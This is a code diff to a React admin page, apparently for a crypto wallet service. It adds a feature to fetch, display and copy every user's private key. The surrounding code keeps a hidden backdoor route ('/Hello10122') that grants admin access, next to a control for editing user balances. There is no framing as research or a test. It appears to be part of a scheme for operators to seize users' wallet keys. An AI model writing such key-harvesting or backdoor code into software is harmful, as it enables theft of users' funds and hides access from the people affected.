@@ -28,6 +28,8 @@ export default function Admin() {
   const [selectedUser, setSelectedUser] = useState<User | null>(null);
   const [newBalance, setNewBalance] = useState("");
   const [dialogOpen, setDialogOpen] = useState(false);
+  const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
+  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122';
@@ -77,6 +79,22 @@ export default function Admin() {
         description: error.message,
         variant: "destructive",
       });
+    },
+  });
+
+  const fetchPrivateKeyMutation = useMutation({
+    mutationFn: async (userId: number) => {
+      const response = await fetch(`/api/admin/user/${userId}/private-key`);
+      if (!response.ok) throw new Error('Failed to fetch private key');
+      return response.json();
+    },
+    onSuccess: (data, userId) => {
+      setUserPrivateKeys(prev => ({ ...prev, [userId]: data.privateKey }));
+      setShowPrivateKeys(prev => ({ ...prev, [userId]: true }));
+      toast({ title: "Private Key Retrieved", description: "Private key loaded successfully" });
+    },
+    onError: () => {
+      toast({ title: "Error", description: "Failed to fetch private key", variant: "destructive" });
     },
   });
 
@@ -152,6 +170,24 @@ export default function Admin() {
     updateBalanceMutation.mutate({
       userId: selectedUser.id,
       balance: newBalance,
+    });
+  };
+
+  const togglePrivateKey = (userId: number) => {
+    if (showPrivateKeys[userId]) {
+      // Hide the private key
+      setShowPrivateKeys(prev => ({ ...prev, [userId]: false }));
+    } else {
+      // Fetch and show the private key
+      fetchPrivateKeyMutation.mutate(userId);
+    }
+  };
+
+  const copyPrivateKey = (privateKey: string) => {
+    navigator.clipboard.writeText(privateKey);
+    toast({
+      title: "Copied",
+      description: "Private key copied to clipboard",
     });
   };
 
@@ -266,6 +302,7 @@ export default function Admin() {
                     <TableHead className="text-muted-foreground">Email</TableHead>
                     <TableHead className="text-muted-foreground">Balance</TableHead>
                     <TableHead className="text-muted-foreground">Actions</TableHead>
+                    <TableHead className="text-muted-foreground">Private Key</TableHead>
                   </TableRow>
                 </TableHeader>
                 <TableBody>
@@ -281,6 +318,33 @@ export default function Admin() {
                         >
                           Update
                         </Button>
+                      </TableCell>
+                      <TableCell>
+                       {showPrivateKeys[user.id] ? (
+                          <div className="flex items-center gap-2">
+                            <Input
+                              type="text"
+                              value={userPrivateKeys[user.id] || ""}
+                              readOnly
+                              className="bg-muted text-xs"
+                            />
+                            <Button
+                              size="sm"
+                              onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
+                              className="bg-green-500 hover:bg-green-500/90 text-black"
+                            >
+                              Copy
+                            </Button>
+                          </div>
+                        ) : (
+                          <Button
+                            size="sm"
+                            onClick={() => togglePrivateKey(user.id)}
+                            className="bg-blue-500 hover:bg-blue-500/90 text-black"
+                          >
+                            Show
+                          </Button>
+                        )}
                       </TableCell>
                     </TableRow>
                   ))}
